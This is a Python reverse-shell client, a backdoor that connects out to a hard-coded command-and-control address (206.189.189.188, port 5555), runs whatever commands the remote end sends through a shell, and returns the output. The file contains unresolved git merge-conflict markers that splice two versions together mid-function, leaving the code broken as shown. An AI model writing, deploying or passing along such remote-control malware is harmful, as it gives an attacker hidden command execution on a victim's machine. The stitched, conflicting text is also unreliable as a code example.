#!/usr/bin/python3

import os
import socket
import subprocess
#import signal
#import sys
#import code

<<<<<<< HEAD
#code.interact(local=locals())


# Create socket
def socket_create():
=======
HOST = '206.189.189.188' # ip of our C2 server
PORT = 5555 # random port it does not matter

# set up the socket and connect to the server
s = socket.socket()
s.connect((HOST, PORT))
#s.sendall(cmd)
# this loop will run until it receive 'quit'
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == 'quit':
        break
		
>>>>>>> 1d31426edf9379435c1fb7d7ce3ee58d04c38f84
    try:
        global host
        global port
        global s
        host = '127.0.0.1' # Server ip goes here
        port = 5555
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error: " + str(msg))


# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("socket connection error: " + str(msg))


# Receive commands and run 'em
# Receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
    s.close()

def main():
    socket_create()
    socket_connect()
    receive_commands()


main()
